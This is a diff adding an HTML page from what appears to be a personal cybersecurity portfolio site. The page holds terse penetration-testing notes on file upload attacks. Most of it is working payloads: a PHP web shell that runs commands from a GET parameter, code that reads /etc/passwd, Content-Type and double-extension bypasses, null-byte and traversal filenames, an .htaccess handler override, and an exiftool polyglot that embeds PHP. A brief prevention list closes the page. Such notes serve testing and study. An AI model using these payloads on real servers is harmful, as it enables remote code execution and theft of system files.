@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
+    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">
+
+
+
+    <title>Methodology</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <div class="search-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
+                <!-- <button onclick="search()" class="search-button">Search</button> -->
+                <div id="searchResults" class="search-results"></div>
+
+              </div>
+
+            </div>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#home" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div> -->
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="f6e2465b-f6a9-4dc5-b6d0-8af9c6890e24" class="page sans"><header><h1 class="page-title">File Uploads</h1><p class="page-description"></p></header><div class="page-body"><p id="877e1fbb-eb6d-413c-8082-f3e9cec1f62b" class="">
+</p><p id="41fd6809-2c97-4ea3-9888-62e8d764637c" class="">Methodology:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a51f9508-177c-4cc9-9535-7710a3abddee" class="code"><code class="language-Java">- File type changing
+
+- Accept HTML + No CSP? -&gt; File upload XSS</code></pre><p id="30273aed-1a7f-4ae9-a67b-fcd9961c6d98" class="">MIME Types:</p><ul id="62c8f0ae-3799-4ad5-8c83-075ef9863d61" class="bulleted-list"><li style="list-style-type:disc">file extension types that are acceptb;e</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="061b5116-7937-4b14-9b92-365cc14f9580" class="code"><code class="language-Java">multipart/form-data
+text/csv
+text/xml
+text/plain
+application/xml
+application/pdf
+application/zip</code></pre><ul id="be518548-6e3b-4c08-8900-7a25db47537e" class="bulleted-list"><li style="list-style-type:disc">Dig for mimes using Kali’s xdg-mime tool</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="794ffacf-2e0c-4c5f-8659-2530417516ce" class="code"><code class="language-Java">xdg-mime query filetype &lt;file&gt;
+file --mime-type &lt;file&gt;</code></pre><p id="101236a5-31d7-4a40-a924-b0714810d295" class="">
+</p><p id="d80ff427-5999-4966-a6fb-fefbc6c9f1cf" class="">
+</p><p id="91c3916b-f5d5-4461-b7eb-143dea443850" class="">File upload bypass payloads:</p><p id="708cfa94-4cb3-4aac-a3ad-5f29e291ea0b" class="">Regular:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a6b22985-c36f-4571-8e43-586da85dcd19" class="code"><code class="language-PHP">&lt;?php echo system($_GET[&#x27;command&#x27;]); ?&gt;
+#in burp
+GET /example/exploit.php?command=id HTTP/1.1</code></pre><p id="065f8a80-a02b-4247-bb7c-f28360c977c6" class="">Get a files contents:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9e312bd8-7e3e-4b9c-a075-593c4223dccb" class="code"><code class="language-PHP">&lt;?php echo file_get_contents(&#x27;/etc/passwd&#x27;); ?&gt;</code></pre><p id="68da4d3d-46cb-4c0e-b44d-00810c588579" class="">
+</p><p id="0c557bc3-79fd-46b8-82e5-9545ea8f09aa" class="">Bypassing image requirements:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b24f6196-7d4e-43d8-ae4d-b7ed49cce0c2" class="code"><code class="language-PHP">#change the specified Content-Type header to image/jpeg
+Content-Type: image/jpeg;
+Content-Type: image/png;
+#Try changing the contents of the string of the filename
+exploit.php.png
+exploit.png.php</code></pre><p id="d5d0aff1-eea1-4c70-bbdf-eb316027f668" class="">
+</p><p id="b900b1dc-cd70-43a8-891f-adc79db40195" class=""><strong>File execution bypass:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="66318e32-d98d-4cfa-979e-2eed836ca7d4" class="code"><code class="language-PHP">#Upload a legitmate file first -&gt; send to repeater
+#Then upload you exploit file -&gt; send to repeater
+
+#Trigger the executiob of the image file... send to repeater 
+</code></pre><p id="a9900cfd-35d9-4139-b069-e208f14a5b1f" class="">
+</p><p id="bd084985-407d-4253-8a6b-3701104ded97" class=""><strong>PHP file extension bypass:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="993b005e-1218-430d-945f-7ef14779071d" class="code"><code class="language-JavaScript">php
+php2-7
+phps
+ctp
+inc
+ctp
+hphp
+pgif
+php.jpg
+phtml
+phar</code></pre><p id="449529ef-0aba-4104-b54f-af00a0483021" class="">Other:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8790a610-c64a-4f5a-883a-3e8794e972ef" class="code"><code class="language-PHP">exploit%2Ephp
+exploit.p.phphp
+exploit.asp;.jpg
+exploit.asp%00.jpg</code></pre><p id="ee63db8b-3cd0-4229-a977-a613adcdebc3" class="">F<strong>ile upload race conditions:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="809ecf65-6c28-497b-bf66-40dc4c260748" class="code"><code class="language-PHP"></code></pre><p id="ada962cb-b44d-4eaf-8895-bf47ad541f50" class="">
+</p><p id="0e7f9425-6778-4567-8b4f-d2e28e0c62ef" class="">Examples</p><p id="de450a42-dccc-4cbd-bc08-ae06f9ff2aad" class="">
+</p><p id="0714cd51-5843-4a74-bdff-44968d3551ee" class="">Bypass through directory traversal:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="39f7c451-bc47-46f2-b4a0-c27e89e8de5b" class="code"><code class="language-Java"># upload the web shell as normal. Then in repeater, utilize directory traversal
+#to determine where this file is stored on the server.
+#example
+filename=../file.php
+- also try URL encoding</code></pre><p id="38ab920f-674a-41f3-ab73-a41f7a6f0893" class="">
+</p><p id="b11c1658-42d2-4f56-982d-5a3071bbb954" class="">
+</p><p id="18b4e34f-ce4b-4d08-a37d-3273d6a84684" class="">Apache file upload bypass:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fbbea2df-7e58-40bf-841f-24caaf3a990f" class="code"><code class="language-Java">- Try to upload a file with .htaccess file name in repeater...
+
+Under content-type add:
+AddType application/x-httpd-php .xyz
+
+- change filetype extension of webshell to .xyz
+
+</code></pre><p id="06336d06-29aa-443d-809d-dfec5d96f0a5" class="">
+</p><p id="b071430b-985f-4d02-b777-faca842b4414" class="">Polyglot webshell upload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1cc4e4ba-bc0e-484c-bf3f-6bbe856159f4" class="code"><code class="language-Java">#php payload into an image using exif tool
+
+exiftool -Comment=&quot;&lt;?php echo file_get_contents(&#x27;/etc/passwd&#x27;); ?&gt;&quot; image.png -o file.php</code></pre><p id="16c39502-30dc-4d66-969d-2f4441feb3cb" class="">
+</p><p id="48b1ceac-fb78-416f-a752-adf4564327bb" class=""><strong>Prevention:</strong></p><p id="908dadd7-398c-44c4-82cc-08917202e8b6" class="">
+</p><ul id="611dc39a-eb63-4381-9a2f-ffde702136bc" class="bulleted-list"><li style="list-style-type:disc">Check the file extension against a whitelist of<br/>permitted extensions rather than a blacklist of prohibited ones. It&#x27;s<br/>much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.<br/></li></ul><ul id="ad94a38d-e4c3-46e5-a3c0-d45fcd2afeaf" class="bulleted-list"><li style="list-style-type:disc">Make sure the filename doesn&#x27;t contain any substrings<br/>that may be interpreted as a directory or a traversal sequence (<br/><code>../</code>).</li></ul><ul id="d28b3544-8cff-404a-a0ea-96f02d227c7d" class="bulleted-list"><li style="list-style-type:disc">Rename uploaded files to avoid collisions that may cause existing files to be overwritten.</li></ul><ul id="eff8c7ca-0e78-4049-bc28-45dedec829e5" class="bulleted-list"><li style="list-style-type:disc">Do not upload files to the server&#x27;s permanent filesystem until they have been fully validated.</li></ul><ul id="7c57302d-67e5-48ca-849b-feef11df2e1c" class="bulleted-list"><li style="list-style-type:disc">As much as possible, use an established framework for<br/>preprocessing file uploads rather than attempting to write your own<br/>validation mechanisms.<br/></li></ul></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="../../../../../../assets/js/main.js"></script>
+    <script src="../../../../../../assets/js/search.js"></script>
+
+
+</body>
+</html>
